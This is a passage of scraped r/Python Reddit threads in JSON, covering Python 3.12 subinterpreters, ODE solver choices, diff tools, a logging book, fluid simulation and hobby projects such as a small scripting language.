            "author": "[deleted]",
            "score": "1",
            "content": "What font is that site shown in? I really like it!",
            "replies": [
                {
                    "author": "patrickbrianmooney",
                    "score": "3",
                    "content": "Using Chrome's page-inspection tools reveals that the body font is Spline Sans Mono."
                }
            ]
        }
    ]
},
{
    "post_author": "ThatsAHumanPerson",
    "post_id": "1c6sdyj",
    "post_score": "205",
    "post_time": "Thursday, April 18, 2024 at 5:30:44 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Achieve true parallelism in Python 3.12",
    "media": [
        "https://rishiraj.me/articles/2024-04/python_subinterpreter_parallelism"
    ],
    "post_content": "Article link: https://rishiraj.me/articles/2024-04/python_subinterpreter_parallelism\nI have written an article, which should be helpful to folks at all experience levels, covering various multi-tasking paradigms in computers, and how they apply in CPython, with its unique limitations like the Global Interpreter Lock. Using this knowledge, we look at traditional ways to achieve \"true parallelism\" (i.e. multiple tasks running at the same time) in Python.\nFinally, we build a solution utilizing newer concepts in Python 3.12 to run any arbitrary pure Python code in parallel across multiple threads. All the code used to achieve this, along with the benchmarking code are available in the repository linked in the blog-post.\nThis is my first time writing a technical post in Python. Any feedback would be really appreciated! 😊",
    "comments": [
        {
            "author": "ryanstephendavis",
            "score": "42",
            "content": "Well-written article... good refresher on a lot of software engineering concepts and it's cool to see some code with the new subinterpreters!"
        },
        {
            "author": "Mount_Gamer",
            "score": "12",
            "content": "Any idea if the sub interpreters will use less memory than the multiprocessing method?",
            "replies": [
                {
                    "author": "ThatsAHumanPerson",
                    "score": "2",
                    "content": "There are some memory leaks associated with sub-interpreters in the current Python implementation. Refer https://github.com/python/cpython/issues/110411. These are expected to be fixed soon, so, I didn't cover these points."
                }
            ]
        },
        {
            "author": "andrejlr",
            "score": "11",
            "content": "Nice summary. Was looking forward to subibinterpreters. This article shows though that they have and probably for a long time will have too many limitations. Practically all production code in my experience is using some native extensions . And after reading this I just don't want to start new experiments for parallel code which is already working . Often, starting new processes is not such a big penalty, as each of them might run hours of computation and consume magnitudes more memory than the pure Python process itself . So one can easily afford it . The real overhead within the default process.Pool lib is the need to serialize ( pickle ) objects between the main process and worker processes . In our experienc, this is where Rey is unbeatable for single machine parallelism . It will give you even same process.Pool.map interface as a one-line replacement, if you want . But under the hood, it is using pyarrow memory format and also a pyarrow store allowing multiple Proccesses to do a direct memory access without serialization"
        },
        {
            "author": "120decibel",
            "score": "12",
            "content": "You might want to cover multiprocessing a bit more in dept as it site-steps the GIL through subprocesses as well. Otherwise great write up, I enjoyed reading it a lot! Thanks!",
            "replies": [
                {
                    "author": "ThatsAHumanPerson",
                    "score": "2",
                    "content": "Added. Thanks!"
                }
            ]
        },
        {
            "author": "protienbudspromax",
            "score": "7",
            "content": "Nice one OP. I knew about that GIL pep but wasnt sure what they implemented in place of that. Was a good read!"
        },
        {
            "author": "EarthyFeet",
            "score": "3",
            "content": "Nice to see. In Py 3.13 this should be implementable in pure python, hopefully"
        },
        {
            "author": "ThatsAHumanPerson",
            "score": "3",
            "content": "Really appreciate all the positive response here! I've made a few changes incorporating the common feedback points:- Briefly covered multiprocessing module Clarified that the performance improvement seen with sub-interpreters isn't conclusive as I've used a very simplistic benchmark."
        },
        {
            "author": "JayZFeelsBad4Me",
            "score": "2",
            "content": "Side note - your website looks great but any plans to add dark mode?"
        }
    ]
},
{
    "post_author": "tootac",
    "post_id": "1ca6lyv",
    "post_score": "0",
    "post_time": "Monday, April 22, 2024 at 12:42:42 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Single file, hot reloading python server with raw websockets and inotify",
    "media": [
        "https://hereket.com/posts/linux_live_reload_python_server/"
    ],
    "post_content": "A project to build a local server without any external dependencies with main features of hot reloading browser on source modification. The idea is to make it simple, standalone and work without any setup.\nThe project uses regular sockets, websockets, inotify and a bit of javascript on the fly embedding to allow users to achieve automatic synchronization with browser. The article describes hot to monitor file changes with direct loading of libc and requesting kernel notify on change.\nFree article and code: https://hereket.com/posts/linux_live_reload_python_server/",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1c94bxm",
    "post_score": "5",
    "post_time": "Sunday, April 21, 2024 at 3:00:11 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "WoodenNichols",
            "score": "2",
            "content": "A program that will create all the combinations of race templates and professional templates for my RPG."
        },
        {
            "author": "athermop",
            "score": "2",
            "content": "https://github.com/dmwyatt/schemafunc Automatically create OpenAI tool/function schemas by adding a decorator to a function."
        },
        {
            "author": "Vegetable_Study3730",
            "score": "2",
            "content": "Working on my library to get an OpenAI-like code interpreter with 1 line of Python code. https://github.com/Jonathan-Adly/AgentRun"
        },
        {
            "author": "Embarrassed-Mix6420",
            "score": "2",
            "content": "Thinking of merging the package search and Python dependency/env containerization (https://github.com/bedbad/reloadpy) I use frequently to the pyimps imports/dependencies static analyzer tool towards full automation of static dependencies. That would be very useful especially for LM generated code files - as the dependencies can be constricted to be of descent proved quality packages and then runtested inside of a venv container before you're informed LM actually did something standalone useful"
        },
        {
            "author": "slasher67",
            "score": "2",
            "content": "Created a small library to generate properly formatted tables on the terminal and to convert them to LaTeX: https://github.com/Kamuish/tabletexifier My plan is to now add the ability to pass \"commands to customize\" the LaTeX cells (i.e. \\textcolor, \\textbf, and similar) and to also render those on the terminal"
        },
        {
            "author": "thereal0ri_",
            "score": "2",
            "content": "Firstly: https://github.com/therealOri/MailerBot It's a discord bot for handling user verification based off of a whitelist containing emails. Secondly: https://github.com/therealOri/PolyLock I've just been brainstorming ideas on what to add to it next and how to make it more fun, etc. Adding layers if you will."
        },
        {
            "author": "riggamortez",
            "score": "2",
            "content": "working on a Blue Team tool that acts as a single pane of glass but as a TUI. I am using textual for the terminal. Will post more as it goes."
        },
        {
            "author": "flaviaouyang",
            "score": "2",
            "content": "Working on a data quality monitoring library designed specifically for time series data GitHub: https://github.com/flaviaouyang/molly"
        },
        {
            "author": "Common_Priority_6917",
            "score": "1",
            "content": "A little search engine built with Whoosh. The dataset was from Kaggle and contains around 45.000 movies. https://github.com/spalominor/BuscaTuPelicula"
        },
        {
            "author": "Difficult_Buy_8382",
            "score": "1",
            "content": "On my Sublime Text editor for Python, why is my terminal screen on not showing what I printed? Please can anyone help me with a solution to it?"
        }
    ]
},
{
    "post_author": "D_vd_P",
    "post_id": "1ca4bwy",
    "post_score": "49",
    "post_time": "Monday, April 22, 2024 at 10:04:44 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What is currently the fastest/state-of-the-art ODE solver in Python?",
    "media": [
        "https://pydstool.github.io/PyDSTool/FrontPage.html",
        "https://github.com/Nicholaswogan/numbalsoda",
        "https://github.com/esa/torchquad",
        "https://github.com/SciML/DifferentialEquations.jl",
        "https://github.com/rtqichen/torchdiffeq"
    ],
    "post_content": "For my application, Scipy's solvers are not fast enough so I am looking to speed up by using another package. These are some packages I have found so far:\nNumbaLSODA\nDifferentialEquations.jl\nTorchquad\n(Although doesn't solve ODEs, just integrates quickly, but that could be wrapped I guess)\nTorchdiffeq\nPyDSTool\nI will be experimenting with these packages, but I was wondering whether anyone has experience with them and has done work on them before. Also, I am wondering whether there are any packages I should check out?",
    "comments": [
        {
            "author": "SosirisTseng",
            "score": "24",
            "content": "Diffrax : https://docs.kidger.site/diffrax/",
            "replies": [
                {
                    "author": "patrickkidger",
                    "score": "16",
                    "content": "Author of Diffrax here :) So +1 for this, we handily beat most other options. As it's written in JAX then we also have GPU support. I can see in another comment you mention needing many Monte Carlo samples. This is exactly the kind of thing that can be very efficiently parallelised on a GPU. (Use jax.vmap.) FWIW if you're new to JAX then I'd recommend pairing this with this function which will warn about recompilations. JAX uses a JIT-compiler -- this is the reason it's so fast -- but it can also be easy to accidentally recompile if you're unfamiliar with how it works. If you already know PyTorch then you may also like this quickstart.",
                    "replies": [
                        {
                            "author": "D_vd_P",
                            "score": "4",
                            "content": "Thanks a lot! I will look into it"
                        },
                        {
                            "author": "D_vd_P",
                            "score": "2",
                            "content": "Does Diffrax have support for systems of 1st order ODEs? Or do I need to write my own wrapper for that?",
                            "replies": [
                                {
                                    "author": "patrickkidger",
                                    "score": "2",
                                    "content": "It supports this!"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "iamgeer",
            "score": "9",
            "content": "Are you sure its the solver thats eating up run time? Run a timer on various parts of your code for a small number of realizations to highlight computational pigs. Are you writing back or storing in a dataframe? They are super slow. Use numpy. You can deploy techniques like experimental design where you use monte carlo to draw sparse realizations and then use thos results to construct a model of the outputs and use the model directly as the solution. Is it posible to use something like LU decomposition?",
            "replies": [
                {
                    "author": "D_vd_P",
                    "score": "2",
                    "content": "For the particular problem I am referencing here I have properly optimized it using numpy, the correct datastructures and efficient memory management. The problem is the sheer quantity of simulations I need to complete as I want to do a monte carlo analysis requiring 10000+ simulations ideally. Right now a simulation takes around 1.5s, so even a 20% performance boost would be quite significant, and I already know I can achieve that using a faster solver. I will also implement multiprocessing and I'm sure there are many other tricks that can be pulled off! The thing is that if I go through the effort of porting the sim to a new solver I would like to use the most optimal one currently available. Besides that, I am also interested in it for future projects where I might need to solve ODEs again. The thing is that there is not a lot of information available about modern solvers and benchmarks comparing them. So I am mostly looking for the solver bit and what is currently available!"
                }
            ]
        },
        {
            "author": "derioderio",
            "score": "8",
            "content": "If your problem is speed, you might consider using Julia to do the ODE solving: https://nextjournal.com/sosiris-de/ode-diffeq https://www.juliabloggers.com/how-to-call-julia-code-from-python/ Julia is just-in-time compiled, so you're not limited by the speed of non-compiled libraries like you are in python. Also Julia has some good packages for difficult to solve ODEs like Algebraic Differential Equations with a singular mass matrix, etc.",
            "replies": [
                {
                    "author": "D_vd_P",
                    "score": "2",
                    "content": "Nice! I will look into it. I think this is also what DifferentialEquations.jl is already doing. It requires you to install Julia and then calls it."
                }
            ]
        },
        {
            "author": "dynamic_caste",
            "score": "4",
            "content": "The \"best\" or \"fastest\" solver would depend on the structure of the ODE and the accuracy requirements."
        },
        {
            "author": "kissekattutanhatt",
            "score": "4",
            "content": "Does it need to be vanilla Python? Otherwise you could try an alternatives such as ODEPACK and write a small wrapper for your specific problem. Edit: apparently, a package you have tried already does exactly that. :("
        },
        {
            "author": "wildpantz",
            "score": "2",
            "content": "For me, scipy's odeint function worked pretty nice when building a genetic algorithm to optimize a DC motor regulated by 3 PIDs. Are you sure you aren't using too many points when solving the equation? Maybe there's some room to optimize there (for example just thin the data set out before passing it to the function). Don't get me wrong, it still takes a while for it to calculate, but I'm saying there's a lot of room to optimize stuff. Alternatively, when I realized that there's tons of simulations to be made anyway and no matter how much I thin out, it still takes like a minute for the algorithm to finish, I decided to do each simulation on its own process using multiprocessing. This way you still are affected by how much time it takes for odeint to finish, but there's at least more of them working in the same time so you should somewhat save time (in my case, lots of time)."
        },
        {
            "author": "beezlebub33",
            "score": "1",
            "content": "If it needs to be fast in Python, what you do is write it in C and call it from python. It's literally what numpy and other packages do. So find a C/C++ ODE solver, optimize it for your use case, and then call it from python."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c7ir92",
    "post_score": "3",
    "post_time": "Friday, April 19, 2024 at 3:00:46 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "TheGupta",
    "post_id": "1c8v0o4",
    "post_score": "16",
    "post_time": "Saturday, April 20, 2024 at 8:10:15 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What's the best library to find differences in two text files and visulaize it?",
    "media": [
        "https://docs.python.org/3/library/difflib.html",
        "https://stackoverflow.com/a/78359052/8321339",
        "https://github.com/google/diff-match-patch"
    ],
    "post_content": "difflib is popular. Most of the answers on Stack Overflow uses it. But, I think Google's diff-match-patch is better. See an example here. Or, am I missing something?",
    "comments": [
        {
            "author": "Nanooc523",
            "score": "6",
            "content": "icdiff is good, you can side by side and color code the output. Looks/works great in a console."
        },
        {
            "author": "the-pythonista",
            "score": "-1",
            "content": "Kaleidoscope on Mac is amazing for visualizing diffs. While a desktop app it does come with a cli option too."
        },
        {
            "author": "imhiya_returns",
            "score": "0",
            "content": "On windows - winmerge is decent"
        }
    ]
},
{
    "post_author": "driscollis",
    "post_id": "1caaapb",
    "post_score": "13",
    "post_time": "Monday, April 22, 2024 at 4:06:49 PM GMT+3",
    "flair_text": "News",
    "post_title": "Announcing The Python Logging Book & Course Kickstarter",
    "media": [
        "https://www.kickstarter.com/projects/driscollis/python-logging-book-and-course"
    ],
    "post_content": "New developers print out strings to their terminal. It’s how we learn! But printing out to the terminal isn’t what you do with most professional applications.\nIn those cases, you log into files. Sometimes, you log into multiple locations at once. These logs may serve as an audit trail for compliance purposes or help the engineers debug what went wrong.\nPython Logging teaches you how to log in the Python programming language. Python is one of the most popular programming languages in the world. Python comes with a logging module that makes logging easy.\nWhat You’ll Learn\nIn this book, you will learn how about the following:\nLogger objects\nLog levels\nLog handlers\nFormatting your logs\nLog configuration\nLogging decorators\nRotating logs\nLogging and concurrency\nand more!\nBook formats\nThe finished book will be made available in the following formats:\npaperback (at the appropriate reward level)\nPDF\nepub\nThe paperback is a 6″ x 9″ book and is approximately 150 pages long.\nYou can check out the book's campaign on Kickstarter.\nLet me know if you have any questions!",
    "comments": [
        {
            "author": "rhytnen",
            "score": "22",
            "content": "Uhhh ... so ill just leave this here. https://docs.python.org/3/howto/logging.html https://docs.python.org/3/howto/logging-cookbook.html"
        },
        {
            "author": "pingveno",
            "score": "4",
            "content": "Perhaps spare a mention for structured logging (structlog)?",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "2",
                    "content": "I do cover structlog and loguru in their own chapters as well"
                }
            ]
        },
        {
            "author": "monorepo",
            "score": "3",
            "content": "Neat!",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "1",
                    "content": "Thanks! I see you like Ruff. That's a neat project too. Charlie and his team are doing a lot of neat things"
                }
            ]
        },
        {
            "author": "psicodelico6",
            "score": "0",
            "content": "Pattern loggings?"
        },
        {
            "author": "db_mdubs",
            "score": "-3",
            "content": "Looking forward to the course…",
            "replies": [
                {
                    "author": "driscollis",
                    "score": "-3",
                    "content": "Thanks! I think it will be fun. I'll be releasing it on Udemy in addition to my own site"
                }
            ]
        }
    ]
},
{
    "post_author": "homelesspancake",
    "post_id": "ehcyf6",
    "post_score": "1881",
    "post_time": "Monday, December 30, 2019 at 1:52:38 AM GMT+3",
    "flair_text": "",
    "post_title": "I made a script that turns images into ASCII art",
    "media": [
        "https://i.redd.it/vjsay0l7jn741.png",
        "https://preview.redd.it/vjsay0l7jn741.png?width=640&crop=smart&auto=webp&s=e50bbd3a80b72bcd28caf8cb9e42ecb0913d96d9"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Astr0l",
            "score": "260",
            "content": "No one's going to mention the image?",
            "replies": [
                {
                    "author": "blundered_bishop",
                    "score": "98",
                    "content": "He just vibin'",
                    "replies": [
                        {
                            "author": "Yakhov",
                            "score": "34",
                            "content": "poppin a squat"
                        }
                    ]
                },
                {
                    "author": "Runtitties",
                    "score": "37",
                    "content": "Yeah, wtf"
                },
                {
                    "author": "HarissaForte",
                    "score": "11",
                    "content": "... if you're brave enough."
                },
                {
                    "author": "[deleted]",
                    "score": "1",
                    "content": "This mf is hollow."
                }
            ]
        },
        {
            "author": "SockTaters",
            "score": "113",
            "content": "Whenever compressing audio/images, it's worth looking at dithering. Say you're reducing a grey-scale photo to just black or white pixels. If there's a large area of medium-light grey, it all becomes white, losing a lot of information. Dithering solves this by calculating the difference between the white/black outcome and the original pixel and passing on that error to adjacent pixels https://en.wikipedia.org/wiki/Floyd%E2%80%93Steinberg_dithering"
        },
        {
            "author": "vindard",
            "score": "12",
            "content": "Solid work OP, this is a really good start! I've never really played with PIL myself before so this was interesting to see. I did some refactoring to make this more concise. The revision history here should give a decent idea of how the code was changed. Each revision is a working version. ------------------------------- Also as a tip, there's a markdown formatting option on here that helps format any code you want to post so that it doesn't get too mangled. Example: # Import an image processing tool from PIL import Image # Decide what image to convert, and make it 1/3 the size image = Image.open(\"ctycgchr36231.jpg\") ..."
        },
        {
            "author": "Helicon_Amateur",
            "score": "11",
            "content": "Giant Dildo? Can he take it?"
        },
        {
            "author": "69shaolin69",
            "score": "5",
            "content": "How many shades of grey?"
        },
        {
            "author": "mr_poopybuthole69",
            "score": "2",
            "content": "What's the idea behind this script ?"
        },
        {
            "author": "R3ap3r_Kn1ght",
            "score": "2",
            "content": "Can I have the code? I'm impressed, it'll be fun messing around with this."
        },
        {
            "author": "RicealiciousRice",
            "score": "2",
            "content": "r/ButtSwords"
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "Great job!!! I’m shocked that you’re new to Python — this is so cool!"
        }
    ]
},
{
    "post_author": "weksoftware",
    "post_id": "1c837h6",
    "post_score": "0",
    "post_time": "Friday, April 19, 2024 at 8:50:57 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "MPCode is a scripting programming language",
    "media": [
        "https://github.com/weksoftware/MPCode"
    ],
    "post_content": "MPCode is a small open-source scripting programming language written in python 3.12\nThe repository with the same name on github.com allows you to modify the language to your own needs, execute small scripts, write programmes and libraries.\nThe language itself already has functions, object groups, logical operators, loops and variables.\nThe current functionality has documentation in three languages (English, Italian and Russian) and some small code samples.\nIt would be very nice to get feedback and ideas from you.\nYou can also develop your own projects based on it, as the project is licensed by MIT.\nLink to the repository: https://github.com/weksoftware/MPCode",
    "comments": [
        {
            "author": "hotplasmatits",
            "score": "14",
            "content": "What problem does this language address? Why was it created?",
            "replies": [
                {
                    "author": "weksoftware",
                    "score": "-16",
                    "content": "",
                    "replies": [
                        {
                            "author": "InvaderToast348",
                            "score": "1",
                            "content": "What does it do that you couldn't do with python? Do existing python modules / packages work? I would argue having to learn a new syntax would slow down projects. Furthermore, there is probably very little material out there in terms of help and knowledge like with normal python, so people will struggle to switch if they encounter a problem and there isn't any help. Edit: When searching mpcode on Google, the first result is something to do with the Indian government. Then it's this post, then a GitHub user with the same name which I confused for this repo, then a bunch more government stuff. It's probably picking out the \"mp\" bit; whatever the reason, it will make searching for anything very annoying. Edit 2: looking at the documentation, I have no idea why anyone would learn or switch to it. It is very very limited in terms of functionality, and imo the syntax is horrible with a high chance to make errors when everything is square brackets. I'm not exactly sure the purpose of it's existence, as there's no reason the example scripts couldn't just be made in normal python with a much clearer, understandable and well-known syntax. Not to mention the huge number of resources available. It's cool that you've made your own language, but I can't see the need for this when the language its built on is far better. Please could you give me 3 use cases where MPCode would be a better fit than python? Edit 3: looking at the hello world script, or any of the examples, how on earth am I supposed to figure out what it means or does without looking for every instruction in the documentation? There's no point having 1 letter function names when it causes more friction for the user than if it had just been proper words. Also, not having a way to run a script other than manually type or copy-paste the filename into the input prompt is not great. It should read from arguments passed at the command line, like \"python3 run-file.py example.txt\". Also, is there a special file ending or just using .txt? https://github.com/weksoftware/MPCode/blob/df4ea62e69424c5a54cf5d16ff13e1242c146621/examples/mpcode/hello_world.txt",
                            "replies": [
                                {
                                    "author": "weksoftware",
                                    "score": "1",
                                    "content": "Hi. First I want to say thanks for the reasoned comment. Almost all of your statements are true and we are not going to deny them. Indeed, the syntax is not very secure and the functionality is small. It is difficult to find MPCode on Google, as it was created recently and there are not enough results about it yet. The current version is a kind of beta test. A lot of things we want to do are not implemented yet. And we think we were a little (or a lot) hasty in publishing information about MPCode. MPCode cannot replace Python right now. It is a tool, not a replacement. About 1 letter function names, in the future they will be just synonyms (aliases) for full names. And yes, launching a file via command line will be available in the nearest versions, we know it's much more convenient. We are still thinking about endings for file names, it will be different from .txt Thanks again for your comment!"
                                }
                            ]
                        },
                        {
                            "author": "tunisia3507",
                            "score": "1",
                            "content": "We want to create a programming language that can be easily modified And Ruby didn't fit the bill?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "dukeblue219",
            "score": "10",
            "content": "\"it is licensed by MIT\" is not the same meaning as \"it is released under the MIT license\" though the difference may not be obvious to a non-native speaker.",
            "replies": [
                {
                    "author": "weksoftware",
                    "score": "2",
                    "content": "Yeah, sorry for the misunderstanding. We meant \"released under the MIT licence\""
                }
            ]
        },
        {
            "author": "Reinventing_Wheels",
            "score": "3",
            "content": "So you wrote a scripting language interpreter in another scripting language. I'm not sure how to feel about that."
        },
        {
            "author": "Mecaneer23",
            "score": "2",
            "content": "This seems cool - sorta reminds me of a Lisp dialect but with brackets instead of parens"
        },
        {
            "author": "DhoTjai",
            "score": "3",
            "content": "Sorry, this needs to be out of my brains. MPCode (My Penis Code) by whacksoftware.",
            "replies": [
                {
                    "author": "Findanamegoddammit",
                    "score": "1",
                    "content": "Wait I’m developing an app called MPRUN, shall I consider changing the name?"
                }
            ]
        }
    ]
},
{
    "post_author": "GregTJ",
    "post_id": "fkk7aa",
    "post_score": "1920",
    "post_time": "Wednesday, March 18, 2020 at 8:09:55 AM GMT+3",
    "flair_text": "Scientific Computing",
    "post_title": "Fluid simulation in Python",
    "media": [
        "https://external-preview.redd.it/JVR1nXqa7aqkpL39TSUjWxcZJ4P3n_r7vtGJOWULzt8.gif?width=640&crop=smart&format=png8&s=c9f8b6ffcfc0d6e10c28cfd72ce497faea957f0b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "GregTJ",
            "score": "79",
            "content": "Repo: https://github.com/GregTJ/stable-fluids While an earlier version was based mostly on Nvidia's GPU gems article on fluid simulation, some valuable insights were gained through this blog post: http://www.philipzucker.com/annihilating-my-friend-will-with-a-python-fluid-simulation-like-the-cur-he-is/ I hope to add surface tracking, multigrid solving, proper boundary conditions, and lagrangian (FLIP) solving soon.",
            "replies": [
                {
                    "author": "The_Regent",
                    "score": "56",
                    "content": "Hey hey! I wrote that post! I get a huge kick out of the fact it was helpful to someone, so thanks for letting me know! You did a really good job here. The code looks tight and the results look great. For others, i highly reccommend checking out Dan Piponi's talk https://www.youtube.com/watch?v=766obijdpuU really excellent, very approachable. Also Bridson's notes https://www.cs.ubc.ca/~rbridson/fluidsimulation/fluids_notes.pdf and textbook https://www.amazon.com/Simulation-Computer-Graphics-Robert-Bridson/dp/1568813260",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "9",
                            "content": "Thanks for the great blog post, I wouldn't have gotten far without it. Initially I was building fd matrices row by row, your post introduced me to the (much, much faster) kronsum way of constructing them."
                        }
                    ]
                },
                {
                    "author": "BovineLightning",
                    "score": "12",
                    "content": "Some other conditions thatd be cool would be different densities for the fluids which interact and 3D modelling simulations Not sure if you’ve heard of Two Minute Papers but he does some amazing videos in fluid modelling and covering cutting research papers (also has been doing a lot of AI/ML lately)",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "2",
                            "content": "Late reply but just wanted to say I binge watched like 100 of their videos. Super cool channel."
                        }
                    ]
                },
                {
                    "author": "ad_abstract",
                    "score": "2",
                    "content": "Have you tried replacing some of the numpy ops with jax?",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "1",
                            "content": "I haven't, would you recommend doing so?"
                        }
                    ]
                },
                {
                    "author": "akaCryptic",
                    "score": "1",
                    "content": "I got an idea for a musoc video. How would you go about modifying this so that after the colours blend in, an impressionist painting / image reveals?",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "2",
                            "content": "I would either use a video editor or mess around with pillow / PIL."
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "That's terrible, have you considered taking it to a medical professional for a checkup? https://youtu.be/qA6C3ZXoLOE",
            "replies": [
                {
                    "author": "Glycerine",
                    "score": "11",
                    "content": "That's terrible, have you considered taking it to a medical professional for a checkup? https://youtu.be/qA6C3ZXoLOE"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "11",
            "content": "Wow, that's awesome. Some frames would look great printed and put on a wall. edit: Ah, I see you're also experimenting with generative art."
        },
        {
            "author": "narakputra",
            "score": "5",
            "content": "Amazing, please consider making a tutorial for this."
        },
        {
            "author": "NewCenturyNarratives",
            "score": "4",
            "content": "This is the sort of stuff that I'm interested in learning how to do with Python. There seems to be a community focus on stats, but I'm more interested in modeling using continuous mathematics. Is there a specific place where I should be looking for information and inspiration?"
        },
        {
            "author": "wingtales",
            "score": "4",
            "content": "The code is really gorgeous! Well-written stuff! Good job!"
        },
        {
            "author": "TechnoConserve",
            "score": "3",
            "content": "How long does it have to run to create that gif?"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Big whirls have little whirls, that feed on their velocity, And little whirls have lesser whirls and so on to viscosity!"
        },
        {
            "author": "snarfdog",
            "score": "2",
            "content": "I will never get tired of karman vortex streets"
        },
        {
            "author": "nota3lephant",
            "score": "2",
            "content": "This is what it looks like when the fire, water, earth, and wind nations are at peace."
        }
    ]
},
{
    "post_author": "theowni",
    "post_id": "1c77rcy",
    "post_score": "3",
    "post_time": "Thursday, April 18, 2024 at 7:32:34 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Web API Security Champion: Broken Object Level Authorization (OWASP TOP 10) for Python Developers",
    "media": [
        "https://devsec-blog.com/2024/04/web-api-security-champion-broken-object-level-authorization-owasp-top-10/"
    ],
    "post_content": "Explaining one of the most common web API vulnerability classes - Broken Object Level Authorization in a practical manner. Providing a case study example based on the Damn Vulnerable RESTaurant API, including methods for identifying and preventing these vulnerabilities.\nhttps://devsec-blog.com/2024/04/web-api-security-champion-broken-object-level-authorization-owasp-top-10/",
    "comments": []
},
{
    "post_author": "[deleted]",
    "post_id": "9oqlvl",
    "post_score": "1769",
    "post_time": "Tuesday, October 16, 2018 at 9:55:04 PM GMT+3",
    "flair_text": "",
    "post_title": "I made this with Python. So Proud.",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "NickAMD",
            "score": "421",
            "content": "Now can you add in an AI that will simulate the colonization of the planet in orbit, in which its inhabitants use all available resources until they are unable to continue living there, inevitably failing as a species? With python",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "191",
                    "content": "One day I will be god and it will be good",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "17",
                            "content": "Eli?",
                            "replies": [
                                {
                                    "author": "Melkor333",
                                    "score": "4",
                                    "content": "Eru?"
                                }
                            ]
                        },
                        {
                            "author": "Pehrgryn",
                            "score": "2",
                            "content": "Try: import divinity"
                        }
                    ]
                },
                {
                    "author": "bitflip",
                    "score": "56",
                    "content": "Isn't there a library for that?"
                },
                {
                    "author": "thereShouldBeaLogin",
                    "score": "30",
                    "content": "\"And make it in a week for $100\" - 8/10 clients"
                }
            ]
        },
        {
            "author": "Dustin-",
            "score": "112",
            "content": "I think you did import antigravity backwards."
        },
        {
            "author": "OBstaxs",
            "score": "35",
            "content": "Source ?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "54",
                    "content": "https://pastebin.com/L9wwM6rb"
                }
            ]
        },
        {
            "author": "Vervoltz",
            "score": "24",
            "content": "What are u doing? Everybody knows planets should rotate counter-clockwise! Redo it immediately, please. Wink wink.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "29",
                    "content": "What if this is the view from \"below\"."
                }
            ]
        },
        {
            "author": "ForgottenWatchtower",
            "score": "44",
            "content": "Shoutout to animatplot if you enjoy doing this kind of stuff. Wraps matplotlib to give you a saner animation interface."
        }
    ]
},
{
    "post_author": "IllogicalLunarBear",
    "post_id": "1c97av9",
    "post_score": "0",
    "post_time": "Sunday, April 21, 2024 at 5:35:39 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Alternative data managment tool to replace the need to use Jupyter Notebook for Python",
    "media": [
        "https://github.com/LunarFawn/rna_squirrel",
        "https://pypi.org/project/data-nut-squirrel/",
        "https://pypi.org/project/serena-rna-tool/"
    ],
    "post_content": "What My Project Does:\nFor everyone who says they use jupyter Notebook for Python to do chunks of code work… I developed my own data management system for that kind of stuff that provides a wrapper over serialization that essentially creates pythonic pointers to data on any network drive. I just grab my data that I want to grab. Provides autocomplete and C# like attributes. I can dynamically build any data storage class using UML formatted infrastructure-as-code to build the front end. The back end is completely dynamic. Here is the pypi link. Note that I developed this to handle genomic data that was generated over the course of a week of 24/7 computation, that I break into multiple logical chunks. You dont need to rely on Jupyter to hold your data and you can retrieve it months after generating it.\nThis software routes the data to whatever means you use. It works with databases, pickles, yaml. You just have to add your interface in the data routing class. I just did yaml to start. This is just a wrapper around everything so you can declare your class like normal and at variable declaration you have data permanence instantly with no user interaction.\nIf you pass Y=1 and power off your computer and turn it back on again Y still equals 1 when you call that variable instantly\nTarget Audience (e.g., Is it meant for production, just a toy project, etc.)\nproduction as I use it for my genomic research on my project with Stanford\nComparison (A brief comparison explaining how it differs from existing alternatives.):\nThere is no alternatve to this project as far as i know. It replaces the need for Jupyter Notebook to hold your data as you can retrieve it months after generating it.\nPyPi:\nhttps://pypi.org/project/data-nut-squirrel/\nSource Code:\nhttps://github.com/LunarFawn/rna_squirrel\nEdit: Here is an example of implementation where I actually gave a shit about documentation.\nhttps://pypi.org/project/serena-rna-tool/",
    "comments": [
        {
            "author": "trollsmurf",
            "score": "9",
            "content": "I'd argue it's still better to put all persistent data in a database. I've not used Notebooks for data storage as an argument for it, only for (temporarily) experimenting with code.",
            "replies": [
                {
                    "author": "IllogicalLunarBear",
                    "score": "1",
                    "content": "This software routes the data to whatever means you use. It works with databases, pickles, yaml. You just have to add your interface in the data routing class. I just did yaml to start. This is just a wrapper around everything so you can declare your class like normal and at variable declaration you have data permanence instantly with no user interaction"
                },
                {
                    "author": "IllogicalLunarBear",
                    "score": "1",
                    "content": "This package allows you to instantiate a class like normal as you go, but all data generated in that class is permanent abd still there after power cycle. You can instantiate 100 classes abd you can access those 100 classes after a power cycle just by calling the data",
